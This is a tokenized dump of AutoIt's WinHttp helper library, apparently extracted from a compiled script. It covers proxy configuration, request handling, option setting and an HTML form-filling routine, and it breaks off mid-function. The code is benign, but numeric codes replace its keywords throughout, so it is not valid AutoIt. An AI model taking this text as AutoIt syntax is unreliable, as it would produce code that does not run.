3466($URLBUFFER,1)
33
32_WINHTTPDETECTAUTOPROXYCONFIGURL($IAUTODETECTFLAGS)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpDetectAutoProxyConfigUrl","dword",$IAUTODETECTFLAGS,"ptr*",0)
4@ERROR23$ACALL[0]534287(1,0,"")
28$PSTR=$ACALL[2]
4$PSTR5
28$ILEN=__WINHTTPPTRSTRINGLENW($PSTR)
4@ERROR534287(2,0,"")
28$TSTRING=65("wchar["&$ILEN+1&"]",$PSTR)
28$SSTRING=66($TSTRING,1)
__WINHTTPMEMGLOBALFREE($PSTR)
34$SSTRING
8
34""
33
32_WINHTTPGETDEFAULTPROXYCONFIGURATION()
28$TWINHTTP_PROXY_INFO=65("dword AccessType;"&"ptr Proxy;"&"ptr ProxyBypass")
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpGetDefaultProxyConfiguration","struct*",$TWINHTTP_PROXY_INFO)
4@ERROR23$ACALL[0]534287(1,0,0)
28$IACCESSTYPE=66($TWINHTTP_PROXY_INFO,"AccessType")
28$PPROXY=66($TWINHTTP_PROXY_INFO,"Proxy")
28$PPROXYBYPASS=66($TWINHTTP_PROXY_INFO,"ProxyBypass")
28$SPROXY
4$PPROXY5
28$IPROXYLEN=__WINHTTPPTRSTRINGLENW($PPROXY)
43@ERROR5
28$TPROXY=65("wchar["&$IPROXYLEN+1&"]",$PPROXY)
$SPROXY=66($TPROXY,1)
__WINHTTPMEMGLOBALFREE($PPROXY)
8
8
28$SPROXYBYPASS
4$PPROXYBYPASS5
28$IPROXYBYPASSLEN=__WINHTTPPTRSTRINGLENW($PPROXYBYPASS)
43@ERROR5
28$TPROXYBYPASS=65("wchar["&$IPROXYBYPASSLEN+1&"]",$PPROXYBYPASS)
$SPROXYBYPASS=66($TPROXYBYPASS,1)
__WINHTTPMEMGLOBALFREE($PPROXYBYPASS)
8
8
28$ARET[3]=[$IACCESSTYPE,$SPROXY,$SPROXYBYPASS]
34$ARET
33
32_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER()
28$TWINHTTP_CURRENT_USER_IE_PROXY_CONFIG=65("int AutoDetect;"&"ptr AutoConfigUrl;"&"ptr Proxy;"&"ptr ProxyBypass;")
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpGetIEProxyConfigForCurrentUser","struct*",$TWINHTTP_CURRENT_USER_IE_PROXY_CONFIG)
4@ERROR23$ACALL[0]534287(1,0,0)
28$IAUTODETECT=66($TWINHTTP_CURRENT_USER_IE_PROXY_CONFIG,"AutoDetect")
28$PAUTOCONFIGURL=66($TWINHTTP_CURRENT_USER_IE_PROXY_CONFIG,"AutoConfigUrl")
28$PPROXY=66($TWINHTTP_CURRENT_USER_IE_PROXY_CONFIG,"Proxy")
28$PPROXYBYPASS=66($TWINHTTP_CURRENT_USER_IE_PROXY_CONFIG,"ProxyBypass")
28$SAUTOCONFIGURL
4$PAUTOCONFIGURL5
28$IAUTOCONFIGURLLEN=__WINHTTPPTRSTRINGLENW($PAUTOCONFIGURL)
43@ERROR5
28$TAUTOCONFIGURL=65("wchar["&$IAUTOCONFIGURLLEN+1&"]",$PAUTOCONFIGURL)
$SAUTOCONFIGURL=66($TAUTOCONFIGURL,1)
__WINHTTPMEMGLOBALFREE($PAUTOCONFIGURL)
8
8
28$SPROXY
4$PPROXY5
28$IPROXYLEN=__WINHTTPPTRSTRINGLENW($PPROXY)
43@ERROR5
28$TPROXY=65("wchar["&$IPROXYLEN+1&"]",$PPROXY)
$SPROXY=66($TPROXY,1)
__WINHTTPMEMGLOBALFREE($PPROXY)
8
8
28$SPROXYBYPASS
4$PPROXYBYPASS5
28$IPROXYBYPASSLEN=__WINHTTPPTRSTRINGLENW($PPROXYBYPASS)
43@ERROR5
28$TPROXYBYPASS=65("wchar["&$IPROXYBYPASSLEN+1&"]",$PPROXYBYPASS)
$SPROXYBYPASS=66($TPROXYBYPASS,1)
__WINHTTPMEMGLOBALFREE($PPROXYBYPASS)
8
8
28$AOUTPUT[4]=[$IAUTODETECT,$SAUTOCONFIGURL,$SPROXY,$SPROXYBYPASS]
34$AOUTPUT
33
32_WINHTTPOPEN($SUSERAGENT=41,$IACCESSTYPE=41,$SPROXYNAME=41,$SPROXYBYPASS=41,$IFLAG=41)
__WINHTTPDEFAULT($SUSERAGENT,__WINHTTPUA())
__WINHTTPDEFAULT($IACCESSTYPE,$WINHTTP_ACCESS_TYPE_NO_PROXY)
__WINHTTPDEFAULT($SPROXYNAME,$WINHTTP_NO_PROXY_NAME)
__WINHTTPDEFAULT($SPROXYBYPASS,$WINHTTP_NO_PROXY_BYPASS)
__WINHTTPDEFAULT($IFLAG,0)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"handle","WinHttpOpen","wstr",$SUSERAGENT,"dword",$IACCESSTYPE,"wstr",$SPROXYNAME,"wstr",$SPROXYBYPASS,"dword",$IFLAG)
4@ERROR23$ACALL[0]534287(1,0,0)
4$IFLAG=$WINHTTP_FLAG_ASYNC5_WINHTTPSETOPTION($ACALL[0],$WINHTTP_OPTION_CONTEXT_VALUE,$WINHTTP_FLAG_ASYNC)
34$ACALL[0]
33
32_WINHTTPOPENREQUEST($HCONNECT,$SVERB=41,$SOBJECTNAME=41,$SVERSION=41,$SREFERRER=41,$SACCEPTTYPES=41,$IFLAGS=41)
__WINHTTPDEFAULT($SVERB,"GET")
__WINHTTPDEFAULT($SOBJECTNAME,"")
__WINHTTPDEFAULT($SVERSION,"HTTP/1.1")
__WINHTTPDEFAULT($SREFERRER,$WINHTTP_NO_REFERER)
__WINHTTPDEFAULT($IFLAGS,$WINHTTP_FLAG_ESCAPE_DISABLE)
28$PACCEPTTYPES
4$SACCEPTTYPES=412250($SACCEPTTYPES)=-15
$PACCEPTTYPES=$WINHTTP_DEFAULT_ACCEPT_TYPES
6
28$ATYPES=331($SACCEPTTYPES,",",2)
28$TACCEPTTYPES=65("ptr["&369($ATYPES)+1&"]")
28$TTYPE[369($ATYPES)]
13$I=015369($ATYPES)-1
$TTYPE[$I]=65("wchar["&323($ATYPES[$I])+1&"]")
69($TTYPE[$I],1,$ATYPES[$I])
69($TACCEPTTYPES,1,67($TTYPE[$I]),$I+1)
14
$PACCEPTTYPES=67($TACCEPTTYPES)
8
28$ACALL=58($HWINHTTPDLL__WINHTTP,"handle","WinHttpOpenRequest","handle",$HCONNECT,"wstr",338($SVERB),"wstr",$SOBJECTNAME,"wstr",338($SVERSION),"wstr",$SREFERRER,"ptr",$PACCEPTTYPES,"dword",$IFLAGS)
4@ERROR23$ACALL[0]534287(1,0,0)
34$ACALL[0]
33
32_WINHTTPQUERYAUTHSCHEMES($HREQUEST,36$ISUPPORTEDSCHEMES,36$IFIRSTSCHEME,36$IAUTHTARGET)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpQueryAuthSchemes","handle",$HREQUEST,"dword*",0,"dword*",0,"dword*",0)
4@ERROR23$ACALL[0]534287(1,0,0)
$ISUPPORTEDSCHEMES=$ACALL[2]
$IFIRSTSCHEME=$ACALL[3]
$IAUTHTARGET=$ACALL[4]
341
33
32_WINHTTPQUERYDATAAVAILABLE($HREQUEST)
28$SREADTYPE="dword*"
417(_WINHTTPQUERYOPTION(_WINHTTPQUERYOPTION(_WINHTTPQUERYOPTION($HREQUEST,$WINHTTP_OPTION_PARENT_HANDLE),$WINHTTP_OPTION_PARENT_HANDLE),$WINHTTP_OPTION_CONTEXT_VALUE),$WINHTTP_FLAG_ASYNC)5$SREADTYPE="ptr"
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpQueryDataAvailable","handle",$HREQUEST,$SREADTYPE,0)
4@ERROR534287(1,0,0)
34288($ACALL[2],$ACALL[0])
33
32_WINHTTPQUERYHEADERS($HREQUEST,$IINFOLEVEL=41,$SNAME=41,$IINDEX=41)
__WINHTTPDEFAULT($IINFOLEVEL,$WINHTTP_QUERY_RAW_HEADERS_CRLF)
__WINHTTPDEFAULT($SNAME,$WINHTTP_HEADER_NAME_BY_INDEX)
__WINHTTPDEFAULT($IINDEX,$WINHTTP_NO_HEADER_INDEX)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpQueryHeaders","handle",$HREQUEST,"dword",$IINFOLEVEL,"wstr",$SNAME,"wstr","","dword*",65536,"dword*",$IINDEX)
4@ERROR23$ACALL[0]534287(1,0,"")
34288($ACALL[6],$ACALL[4])
33
32_WINHTTPQUERYOPTION($HINTERNET,$IOPTION)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpQueryOption","handle",$HINTERNET,"dword",$IOPTION,"ptr",0,"dword*",0)
4@ERROR2$ACALL[0]534287(1,0,"")
28$ISIZE=$ACALL[4]
28$TBUFFER
23$IOPTION
21$WINHTTP_OPTION_CONNECTION_INFO,$WINHTTP_OPTION_PASSWORD,$WINHTTP_OPTION_PROXY_PASSWORD,$WINHTTP_OPTION_PROXY_USERNAME,$WINHTTP_OPTION_URL,$WINHTTP_OPTION_USERNAME,$WINHTTP_OPTION_USER_AGENT,$WINHTTP_OPTION_PASSPORT_COBRANDING_TEXT,$WINHTTP_OPTION_PASSPORT_COBRANDING_URL
$TBUFFER=65("wchar["&$ISIZE+1&"]")
21$WINHTTP_OPTION_PARENT_HANDLE,$WINHTTP_OPTION_CALLBACK,$WINHTTP_OPTION_SERVER_CERT_CONTEXT
$TBUFFER=65("ptr")
21$WINHTTP_OPTION_CONNECT_TIMEOUT,$WINHTTP_AUTOLOGON_SECURITY_LEVEL_HIGH,$WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW,$WINHTTP_AUTOLOGON_SECURITY_LEVEL_MEDIUM,$WINHTTP_OPTION_CONFIGURE_PASSPORT_AUTH,$WINHTTP_OPTION_CONNECT_RETRIES,$WINHTTP_OPTION_EXTENDED_ERROR,$WINHTTP_OPTION_HANDLE_TYPE,$WINHTTP_OPTION_MAX_CONNS_PER_1_0_SERVER,$WINHTTP_OPTION_MAX_CONNS_PER_SERVER,$WINHTTP_OPTION_MAX_HTTP_AUTOMATIC_REDIRECTS,$WINHTTP_OPTION_RECEIVE_RESPONSE_TIMEOUT,$WINHTTP_OPTION_RECEIVE_TIMEOUT,$WINHTTP_OPTION_RESOLVE_TIMEOUT,$WINHTTP_OPTION_SECURITY_FLAGS,$WINHTTP_OPTION_SECURITY_KEY_BITNESS,$WINHTTP_OPTION_SEND_TIMEOUT
$TBUFFER=65("int")
21$WINHTTP_OPTION_CONTEXT_VALUE
$TBUFFER=65("dword_ptr")
216
$TBUFFER=65("byte["&$ISIZE&"]")
24
$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpQueryOption","handle",$HINTERNET,"dword",$IOPTION,"struct*",$TBUFFER,"dword*",$ISIZE)
4@ERROR23$ACALL[0]534287(2,0,"")
3466($TBUFFER,1)
33
32_WINHTTPREADDATA($HREQUEST,$IMODE=41,$INUMBEROFBYTESTOREAD=41,$PBUFFER=41)
__WINHTTPDEFAULT($IMODE,0)
__WINHTTPDEFAULT($INUMBEROFBYTESTOREAD,8192)
28$TBUFFER,$VOUTONERROR=""
4$IMODE=25$VOUTONERROR=13($VOUTONERROR)
23$IMODE
211,2
4$PBUFFER1$PBUFFER<>415
$TBUFFER=65("byte["&$INUMBEROFBYTESTOREAD&"]",$PBUFFER)
6
$TBUFFER=65("byte["&$INUMBEROFBYTESTOREAD&"]")
8
216
$IMODE=0
4$PBUFFER1$PBUFFER<>415
$TBUFFER=65("char["&$INUMBEROFBYTESTOREAD&"]",$PBUFFER)
6
$TBUFFER=65("char["&$INUMBEROFBYTESTOREAD&"]")
8
24
28$SREADTYPE="dword*"
417(_WINHTTPQUERYOPTION(_WINHTTPQUERYOPTION(_WINHTTPQUERYOPTION($HREQUEST,$WINHTTP_OPTION_PARENT_HANDLE),$WINHTTP_OPTION_PARENT_HANDLE),$WINHTTP_OPTION_CONTEXT_VALUE),$WINHTTP_FLAG_ASYNC)5$SREADTYPE="ptr"
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpReadData","handle",$HREQUEST,"struct*",$TBUFFER,"dword",$INUMBEROFBYTESTOREAD,$SREADTYPE,0)
4@ERROR23$ACALL[0]534287(1,0,"")
43$ACALL[4]534287(-1,0,$VOUTONERROR)
4$ACALL[4]<$INUMBEROFBYTESTOREAD5
23$IMODE
210
34288($ACALL[4],322(66($TBUFFER,1),$ACALL[4]))
211
34288($ACALL[4],16(15(66($TBUFFER,1),1,$ACALL[4]),4))
212
34288($ACALL[4],15(66($TBUFFER,1),1,$ACALL[4]))
24
6
23$IMODE
210,2
34288($ACALL[4],66($TBUFFER,1))
211
34288($ACALL[4],16(66($TBUFFER,1),4))
24
8
33
32_WINHTTPRECEIVERESPONSE($HREQUEST)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpReceiveResponse","handle",$HREQUEST,"ptr",0)
4@ERROR23$ACALL[0]534287(1,0,0)
341
33
32_WINHTTPSENDREQUEST($HREQUEST,$SHEADERS=41,$VOPTIONAL=41,$ITOTALLENGTH=41,$ICONTEXT=41)
__WINHTTPDEFAULT($SHEADERS,$WINHTTP_NO_ADDITIONAL_HEADERS)
__WINHTTPDEFAULT($VOPTIONAL,$WINHTTP_NO_REQUEST_DATA)
__WINHTTPDEFAULT($ITOTALLENGTH,0)
__WINHTTPDEFAULT($ICONTEXT,0)
28$POPTIONAL=0,$IOPTIONALLENGTH=0
4@NUMPARAMS>25
28$TOPTIONAL
$IOPTIONALLENGTH=14($VOPTIONAL)
$TOPTIONAL=65("byte["&$IOPTIONALLENGTH&"]")
4$IOPTIONALLENGTH5$POPTIONAL=67($TOPTIONAL)
69($TOPTIONAL,1,$VOPTIONAL)
8
43$ITOTALLENGTH2$ITOTALLENGTH<$IOPTIONALLENGTH5$ITOTALLENGTH+=$IOPTIONALLENGTH
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpSendRequest","handle",$HREQUEST,"wstr",$SHEADERS,"dword",0,"ptr",$POPTIONAL,"dword",$IOPTIONALLENGTH,"dword",$ITOTALLENGTH,"dword_ptr",$ICONTEXT)
4@ERROR23$ACALL[0]534287(1,0,0)
341
33
32_WINHTTPSETCREDENTIALS($HREQUEST,$IAUTHTARGETS,$IAUTHSCHEME,$SUSERNAME,$SPASSWORD)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpSetCredentials","handle",$HREQUEST,"dword",$IAUTHTARGETS,"dword",$IAUTHSCHEME,"wstr",$SUSERNAME,"wstr",$SPASSWORD,"ptr",0)
4@ERROR23$ACALL[0]534287(1,0,0)
341
33
32_WINHTTPSETDEFAULTPROXYCONFIGURATION($IACCESSTYPE,$SPROXY="",$SPROXYBYPASS="")
28$TPROXY=65("wchar["&323($SPROXY)+1&"]")
69($TPROXY,1,$SPROXY)
28$TPROXYBYPASS=65("wchar["&323($SPROXYBYPASS)+1&"]")
69($TPROXYBYPASS,1,$SPROXYBYPASS)
28$TWINHTTP_PROXY_INFO=65("dword AccessType;"&"ptr Proxy;"&"ptr ProxyBypass")
69($TWINHTTP_PROXY_INFO,"AccessType",$IACCESSTYPE)
4$IACCESSTYPE<>$WINHTTP_ACCESS_TYPE_NO_PROXY5
69($TWINHTTP_PROXY_INFO,"Proxy",67($TPROXY))
69($TWINHTTP_PROXY_INFO,"ProxyBypass",67($TPROXYBYPASS))
8
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpSetDefaultProxyConfiguration","struct*",$TWINHTTP_PROXY_INFO)
4@ERROR23$ACALL[0]534287(1,0,0)
341
33
32_WINHTTPSETOPTION($HINTERNET,$IOPTION,$VSETTING,$ISIZE=41)
4$ISIZE=415$ISIZE=-1
4220($VSETTING)5
$ISIZE=65("byte["&14($VSETTING)&"]")
69($ISIZE,1,$VSETTING)
$VSETTING=$ISIZE
$ISIZE=68($VSETTING)
8
28$STYPE
23$IOPTION
21$WINHTTP_OPTION_AUTOLOGON_POLICY,$WINHTTP_OPTION_CODEPAGE,$WINHTTP_OPTION_CONFIGURE_PASSPORT_AUTH,$WINHTTP_OPTION_CONNECT_RETRIES,$WINHTTP_OPTION_CONNECT_TIMEOUT,$WINHTTP_OPTION_DISABLE_FEATURE,$WINHTTP_OPTION_ENABLE_FEATURE,$WINHTTP_OPTION_ENABLETRACING,$WINHTTP_OPTION_MAX_CONNS_PER_1_0_SERVER,$WINHTTP_OPTION_MAX_CONNS_PER_SERVER,$WINHTTP_OPTION_MAX_HTTP_AUTOMATIC_REDIRECTS,$WINHTTP_OPTION_MAX_HTTP_STATUS_CONTINUE,$WINHTTP_OPTION_MAX_RESPONSE_DRAIN_SIZE,$WINHTTP_OPTION_MAX_RESPONSE_HEADER_SIZE,$WINHTTP_OPTION_READ_BUFFER_SIZE,$WINHTTP_OPTION_RECEIVE_TIMEOUT,$WINHTTP_OPTION_RECEIVE_RESPONSE_TIMEOUT,$WINHTTP_OPTION_REDIRECT_POLICY,$WINHTTP_OPTION_REJECT_USERPWD_IN_URL,$WINHTTP_OPTION_REQUEST_PRIORITY,$WINHTTP_OPTION_RESOLVE_TIMEOUT,$WINHTTP_OPTION_SECURE_PROTOCOLS,$WINHTTP_OPTION_SECURITY_FLAGS,$WINHTTP_OPTION_SECURITY_KEY_BITNESS,$WINHTTP_OPTION_SEND_TIMEOUT,$WINHTTP_OPTION_SPN,$WINHTTP_OPTION_USE_GLOBAL_SERVER_CREDENTIALS,$WINHTTP_OPTION_WORKER_THREAD_COUNT,$WINHTTP_OPTION_WRITE_BUFFER_SIZE,$WINHTTP_OPTION_DECOMPRESSION,$WINHTTP_OPTION_UNSAFE_HEADER_PARSING
$STYPE="dword*"
$ISIZE=4
21$WINHTTP_OPTION_CALLBACK,$WINHTTP_OPTION_PASSPORT_SIGN_OUT
$STYPE="ptr*"
$ISIZE=4
4@AUTOITX645$ISIZE=8
43232($VSETTING)534287(3,0,0)
21$WINHTTP_OPTION_CONTEXT_VALUE
$STYPE="dword_ptr*"
$ISIZE=4
4@AUTOITX645$ISIZE=8
21$WINHTTP_OPTION_PASSWORD,$WINHTTP_OPTION_PROXY_PASSWORD,$WINHTTP_OPTION_PROXY_USERNAME,$WINHTTP_OPTION_USER_AGENT,$WINHTTP_OPTION_USERNAME
$STYPE="wstr"
4(223($VSETTING)2232($VSETTING))534287(3,0,0)
4$ISIZE<15$ISIZE=323($VSETTING)
21$WINHTTP_OPTION_CLIENT_CERT_CONTEXT,$WINHTTP_OPTION_GLOBAL_PROXY_CREDS,$WINHTTP_OPTION_GLOBAL_SERVER_CREDS,$WINHTTP_OPTION_HTTP_VERSION,$WINHTTP_OPTION_PROXY
$STYPE="ptr"
43(223($VSETTING)2232($VSETTING))534287(3,0,0)
216
34287(1,0,0)
24
4$ISIZE<15
4223($VSETTING)5
$ISIZE=68($VSETTING)
6
34287(2,0,0)
8
8
28$ACALL
4223($VSETTING)5
$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpSetOption","handle",$HINTERNET,"dword",$IOPTION,$STYPE,67($VSETTING),"dword",$ISIZE)
6
$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpSetOption","handle",$HINTERNET,"dword",$IOPTION,$STYPE,$VSETTING,"dword",$ISIZE)
8
4@ERROR23$ACALL[0]534287(4,0,0)
341
33
32_WINHTTPSETSTATUSCALLBACK($HINTERNET,$HINTERNETCALLBACK,$INOTIFICATIONFLAGS=41)
__WINHTTPDEFAULT($INOTIFICATIONFLAGS,$WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"ptr","WinHttpSetStatusCallback","handle",$HINTERNET,"ptr",61($HINTERNETCALLBACK),"dword",$INOTIFICATIONFLAGS,"ptr",0)
4@ERROR534287(1,0,0)
34$ACALL[0]
33
32_WINHTTPSETTIMEOUTS($HINTERNET,$IRESOLVETIMEOUT=41,$ICONNECTTIMEOUT=41,$ISENDTIMEOUT=41,$IRECEIVETIMEOUT=41)
__WINHTTPDEFAULT($IRESOLVETIMEOUT,0)
__WINHTTPDEFAULT($ICONNECTTIMEOUT,60000)
__WINHTTPDEFAULT($ISENDTIMEOUT,30000)
__WINHTTPDEFAULT($IRECEIVETIMEOUT,30000)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpSetTimeouts","handle",$HINTERNET,"int",$IRESOLVETIMEOUT,"int",$ICONNECTTIMEOUT,"int",$ISENDTIMEOUT,"int",$IRECEIVETIMEOUT)
4@ERROR23$ACALL[0]534287(1,0,0)
341
33
32_WINHTTPSIMPLEBINARYCONCAT(36$BBINARY1,36$BBINARY2)
23220($BBINARY1)+2*220($BBINARY2)
210
34287(1,0,13(""))
211
34$BBINARY1
212
34$BBINARY2
24
28$TAUXILIARY=65("byte["&14($BBINARY1)&"];byte["&14($BBINARY2)&"]")
69($TAUXILIARY,1,$BBINARY1)
69($TAUXILIARY,2,$BBINARY2)
28$TOUTPUT=65("byte["&68($TAUXILIARY)&"]",67($TAUXILIARY))
3466($TOUTPUT,1)
33
32_WINHTTPSIMPLEFORMFILL(36$HINTERNET,$SACTIONPAGE=41,$SFORMID=41,$SFLDID1=41,$SDTA1=41,$SFLDID2=41,$SDTA2=41,$SFLDID3=41,$SDTA3=41,$SFLDID4=41,$SDTA4=41,$SFLDID5=41,$SDTA5=41,$SFLDID6=41,$SDTA6=41,$SFLDID7=41,$SDTA7=41,$SFLDID8=41,$SDTA8=41,$SFLDID9=41,$SDTA9=41,$SFLDID10=41,$SDTA10=41,$SFLDID11=41,$SDTA11=41,$SFLDID12=41,$SDTA12=41,$SFLDID13=41,$SDTA13=41,$SFLDID14=41,$SDTA14=41,$SFLDID15=41,$SDTA15=41,$SFLDID16=41,$SDTA16=41,$SFLDID17=41,$SDTA17=41,$SFLDID18=41,$SDTA18=41,$SFLDID19=41,$SDTA19=41,$SFLDID20=41,$SDTA20=41,$SFLDID21=41,$SDTA21=41,$SFLDID22=41,$SDTA22=41,$SFLDID23=41,$SDTA23=41,$SFLDID24=41,$SDTA24=41,$SFLDID25=41,$SDTA25=41,$SFLDID26=41,$SDTA26=41,$SFLDID27=41,$SDTA27=41,$SFLDID28=41,$SDTA28=41,$SFLDID29=41,$SDTA29=41,$SFLDID30=41,$SDTA30=41,$SFLDID31=41,$SDTA31=41,$SFLDID32=41,$SDTA32=41,$SFLDID33=41,$SDTA33=41,$SFLDID34=41,$SDTA34=41,$SFLDID35=41,$SDTA35=41,$SFLDID36=41,$SDTA36=41,$SFLDID37=41,$SDTA37=41,$SFLDID38=41,$SDTA38=41,$SFLDID39=41,$SDTA39=41,$SFLDID40=41,$SDTA40=41)
__WINHTTPDEFAULT($SACTIONPAGE,"")
28$INUMARGS=@NUMPARAMS,$SADDITIONALHEADERS,$SCREDNAME,$SCREDPASS,$IIGNORECERTERR,$IRETARR
28$ADTAS[41]=[0,$SDTA1,$SDTA2,$SDTA3,$SDTA4,$SDTA5,$SDTA6,$SDTA7,$SDTA8,$SDTA9,$SDTA10,$SDTA11,$SDTA12,$SDTA13,$SDTA14,$SDTA15,$SDTA16,$SDTA17,$SDTA18,$SDTA19,$SDTA20,$SDTA21,$SDTA22,$SDTA23,$SDTA24,$SDTA25,$SDTA26,$SDTA27,$SDTA28,$SDTA29,$SDTA30,$SDTA31,$SDTA32,$SDTA33,$SDTA34,$SDTA35,$SDTA36,$SDTA37,$SDTA38,$SDTA39,$SDTA40]
28$AFLDS[41]=[0,$SFLDID1,$SFLDID2,$SFLDID3,$SFLDID4,$SFLDID5,$SFLDID6,$SFLDID7,$SFLDID8,$SFLDID9,$SFLDID10,$SFLDID11,$SFLDID12,$SFLDID13,$SFLDID14,$SFLDID15,$SFLDID16,$SFLDID17,$SFLDID18,$SFLDID19,$SFLDID20,$SFLDID21,$SFLDID22,$SFLDID23,$SFLDID24,$SFLDID25,$SFLDID26,$SFLDID27,$SFLDID28,$SFLDID29,$SFLDID30,$SFLDID31,$SFLDID32,$SFLDID33,$SFLDID34,$SFLDID35,$SFLDID36,$SFLDID37,$SFLDID38,$SFLDID39,$SFLDID40]
43240($INUMARGS,2)5
$SADDITIONALHEADERS=$AFLDS[$INUMARGS/2-1]
$AFLDS[$INUMARGS/2-1]=0
$IIGNORECERTERR=311($SADDITIONALHEADERS,"[IGNORE_CERT_ERRORS]")
4$IIGNORECERTERR5$SADDITIONALHEADERS=328($SADDITIONALHEADERS,"[IGNORE_CERT_ERRORS]","",1)
$IRETARR=311($SADDITIONALHEADERS,"[RETURN_ARRAY]")
4$IRETARR5$SADDITIONALHEADERS=328($SADDITIONALHEADERS,"[RETURN_ARRAY]","",1)
28$ACRED=326($SADDITIONALHEADERS,"\[CRED:(.*?)\]",2)
43@ERROR5
28$SCREDDELIM=":"
43311($ACRED[1],$SCREDDELIM)5$SCREDDELIM=","
28$ASTRSPLIT=331($ACRED[1],$SCREDDELIM,3)
43@ERROR5
$SCREDNAME=$ASTRSPLIT[0]
$SCREDPASS=$ASTRSPLIT[1]
8
$SADDITIONALHEADERS=328($SADDITIONALHEADERS,$ACRED[0],"",1)
8
8
28$HOPEN,$AHTML,$SHTML,$SURL,$FVARFORM,$ISCHEME=$INTERNET_SCHEME_HTTP
4233($HINTERNET)5
$SHTML=$HINTERNET
4_WINHTTPQUERYOPTION($SACTIONPAGE,$WINHTTP_OPTION_HANDLE_TYPE)<>$WINHTTP_HANDLE_TYPE_SESSION534287(6,0,"")
$HOPEN=$SACTIONPAGE
$FVARFORM=39
6
$ISCHEME=_WINHTTPQUERYOPTION($HINTERNET,$WINHTTP_OPTION_CONTEXT_VALUE)
28$SACCPT="Accept: text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5"
4$ISCHEME=$INTERNET_SCHEME_HTTPS5
$AHTML=_WINHTTPSIMPLESSLREQUEST($HINTERNET,41,$SACTIONPAGE,41,41,$SACCPT,1,41,$SCREDNAME,$SCREDPASS,$IIGNORECERTERR)
7$ISCHEME=$INTERNET_SCHEME_HTTP5
$AHTML=_WINHTTPSIMPLEREQUEST($HINTERNET,41,$SACTIONPAGE,41,41,$SACCPT,1,41,$SCREDNAME,$SCREDPASS)
6
$AHTML=_WINHTTPSIMPLEREQUEST($HINTERNET,41,$SACTIONPAGE,41,41,$SACCPT,1,41,$SCREDNAME,$SCREDPASS)
4@ERROR2@EXTENDED>=$HTTP_STATUS_BAD_REQUEST5
$AHTML=_WINHTTPSIMPLESSLREQUEST($HINTERNET,41,$SACTIONPAGE,41,41,$SACCPT,1,41,$SCREDNAME,$SCREDPASS,$IIGNORECERTERR)
$ISCHEME=$INTERNET_SCHEME_HTTPS
6
$ISCHEME=$INTERNET_SCHEME_HTTP
8
8
43@ERROR5
$SHTML=$AHTML[1]
$SURL=$AHTML[2]
8
8
$SHTML=327($SHTML,"(?s)<!--.*?-->","")
$SHTML=327($SHTML,"(?s)<!\[CDATA\[.*?\]\]>","")
28$FSEND=40
28$AFORM=326($SHTML,"(?si)<\s*form(?:[^\w])\s*(.*?)(?:(?:<\s*/form\s*>)|\Z)",3)
4@ERROR534287(1,0,"")
28$FGETFORMBYNAME,$SFORMNAME,$FGETFORMBYINDEX,$FGETFORMBYID,$IFORMINDEX
28$ASPLITFORM=331($SFORMID,":",2)
4@ERROR5
$FGETFORMBYID=39
6
4$ASPLITFORM[0]="name"5
$SFORMNAME=$ASPLITFORM[1]
$FGETFORMBYNAME=39
7$ASPLITFORM[0]="index"5
$IFORMINDEX=250($ASPLITFORM[1])
$FGETFORMBYINDEX=39
7$ASPLITFORM[0]="id"5
$SFORMID=$ASPLITFORM[1]
$FGETFORMBYID=39
6
$SFORMID=$ASPLITFORM[0]
$FGETFORMBYID=39
8
8
28$SFORM,$SATTRIBUTES,$AINPUT
28$INUMPARAMS=27(($INUMARGS-2)/2)-1
28$SADDDATA,$SNEWURL
13$IFORMORDINAL=015369($AFORM)-1
4$FGETFORMBYINDEX1$IFORMORDINAL<>$IFORMINDEX519
$SFORM=$AFORM[$IFORMORDINAL]
$SATTRIBUTES=326($SFORM,"(?s)(.*?)>",3)
43@ERROR5$SATTRIBUTES=327($SATTRIBUTES[0],"\v"," ")
28$SACTION="",$SACCEPT="",$SENCTYPE="",$SMETHOD="",$SNAME="",$SID=""
$SID=__WINHTTPATTRIBVAL($SATTRIBUTES,"id")
4$FGETFORMBYID1$SFORMID<>411$SID<>$SFORMID519
$SNAME=__WINHTTPATTRIBVAL($SATTRIBUTES,"name")
4$FGETFORMBYNAME1$SFORMNAME<>$SNAME519
$SACTION=__WINHTTPHTMLDECODE(__WINHTTPATTRIBVAL($SATTRIBUTES,"action"))
$SACCEPT=__WINHTTPATTRIBVAL($SATTRIBUTES,"accept")
$SENCTYPE=__WINHTTPATTRIBVAL($SATTRIBUTES,"enctype")
$SMETHOD=__WINHTTPATTRIBVAL($SATTRIBUTES,"method")
$FSEND=39
28$SSPR1=28(27),$SSPR2=28(26)
__WINHTTPNORMALIZEFORM($SFORM,$SSPR1,$SSPR2)
$AINPUT=326($SFORM,"(?si)<\h*(?:input|textarea|label|fieldset|legend|select|optgroup|option|button)\h*(.*?)/*\h*>",3)
4@ERROR534287(2,0,"")
__WINHTTPHTML5FORMATTRIBS($ADTAS,$AFLDS,$INUMPARAMS,$AINPUT,$SACTION,$SENCTYPE,$SMETHOD)
__WINHTTPNORMALIZEACTIONURL($SACTIONPAGE,$SACTION,$ISCHEME,$SNEWURL,$SENCTYPE,$SMETHOD,$SURL)
4$FVARFORM13$SNEWURL534287(5,0,"")
